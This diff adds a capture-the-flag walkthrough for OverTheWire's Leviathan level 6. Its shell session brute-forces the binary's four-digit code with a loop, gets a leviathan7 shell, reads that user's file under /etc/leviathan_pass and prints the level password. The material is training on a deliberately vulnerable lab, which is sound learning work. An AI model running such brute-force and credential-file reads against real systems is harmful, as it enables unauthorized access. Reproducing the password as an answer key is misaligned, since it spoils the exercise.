@@ -1,0 +1,14 @@
+Video Solution: https://youtu.be/G5bhfEVz2cc
+Task on OverTheWire: http://overthewire.org/wargames/leviathan
+
+leviathan6@leviathan:~$ ls
+leviathan6
+leviathan6@leviathan:~$ ./leviathan6 
+usage: ./leviathan6 <4 digit code>
+leviathan6@leviathan:~$ for i in {0..9}{0..9}{0..9}{0..9}; do ./leviathan6 $i; done
+$ id
+uid=12007(leviathan7) gid=12006(leviathan6) groups=12006(leviathan6)
+$ bash
+leviathan7@leviathan:~$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+leviathan7@leviathan:~$ ssh leviathan7@localhost
